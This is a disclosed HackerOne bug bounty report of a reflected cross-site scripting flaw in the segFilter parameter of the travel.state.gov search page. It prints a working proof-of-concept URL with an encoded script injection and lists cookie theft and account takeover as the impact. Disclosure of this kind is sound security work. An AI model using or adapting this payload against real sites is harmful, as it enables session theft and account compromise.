# RXSS on https://travel.state.gov/content/travel/en/search.html

## Report Details
- **Report ID**: 1818628
- **URL**: https://hackerone.com/reports/1818628
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2022-12-29T17:49:06.123Z
- **Disclosed**: 2023-03-08T01:59:30.205Z

## Reporter
- **Username**: tmz900
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: us-department-of-state

## Vulnerability Information
## Summary:
Hello team,
I Found RXSS via `segFilter` parameter on url : `https://travel.state.gov/content/travel/en/search.html/?search_input=hello&data-sia=false&data-con=false&search_btn=&segFilter=x%27%29%3bconfirm%28%271`
Open url, you will see an alert box pop up:

{F2096019}

## Impact

Steal session cookies to account takeovers
execute JS code

## Attachments
- Screenshot_from_2022-12-30_00-47-14.png
